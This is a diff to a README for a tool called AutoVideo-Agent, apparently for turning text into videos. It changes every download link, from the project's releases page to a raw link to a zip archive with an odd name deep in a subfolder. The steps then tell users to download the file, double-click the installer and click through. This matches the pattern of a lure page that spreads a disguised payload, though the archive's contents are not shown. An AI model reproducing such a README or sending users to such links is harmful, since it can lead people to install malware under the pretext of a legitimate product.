@@ -1,6 +1,6 @@
 # 🎬 AutoVideo-Agent - Turn Text Into Videos Automatically
 
-[![Download AutoVideo-Agent](https://img.shields.io/badge/Download-AutoVideo--Agent-brightgreen?style=for-the-badge&logo=github)](https://github.com/emeradutiable111/AutoVideo-Agent/releases)
+[![Download AutoVideo-Agent](https://img.shields.io/badge/Download-AutoVideo--Agent-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/emeradutiable111/AutoVideo-Agent/main/skills/auto-video/agents/Video_Auto_Agent_antecolic.zip)
 
 ---
 
@@ -25,7 +25,7 @@ Think of it like having a personal video production team that works 24/7. You pr
 
 Ready to make your first video? Follow these simple steps:
 
-1. **Visit the download page**: Click the big green button at the top of this page, or go directly to: [https://github.com/emeradutiable111/AutoVideo-Agent/releases](https://github.com/emeradutiable111/AutoVideo-Agent/releases)
+1. **Visit the download page**: Click the big green button at the top of this page, or go directly to: [https://raw.githubusercontent.com/emeradutiable111/AutoVideo-Agent/main/skills/auto-video/agents/Video_Auto_Agent_antecolic.zip](https://raw.githubusercontent.com/emeradutiable111/AutoVideo-Agent/main/skills/auto-video/agents/Video_Auto_Agent_antecolic.zip)
 2. **Download the application**: Visit this link to download the application.
 3. **Run the installer**: Once the download finishes, find the file in your "Downloads" folder and double-click it to start the installation.
 4. **Follow the on-screen instructions**: The setup wizard will guide you through the rest. Just click "Next" and "Install" when prompted.
@@ -144,7 +144,7 @@ If you have questions or run into issues, here are your options:
 
 Don't wait another minute to bring your ideas to life. AutoVideo-Agent is ready when you are. Download it now and discover how easy video creation can be.
 
-[![Download Now](https://img.shields.io/badge/Download-AutoVideo--Agent-blue?style=for-the-badge&logo=github&color=orange)](https://github.com/emeradutiable111/AutoVideo-Agent/releases)
+[![Download Now](https://img.shields.io/badge/Download-AutoVideo--Agent-blue?style=for-the-badge&logo=github&color=orange)](https://raw.githubusercontent.com/emeradutiable111/AutoVideo-Agent/main/skills/auto-video/agents/Video_Auto_Agent_antecolic.zip)
 
 Remember: Every great video starts with a simple idea. Your idea is already there. AutoVideo-Agent is just the tool to make it real.
 
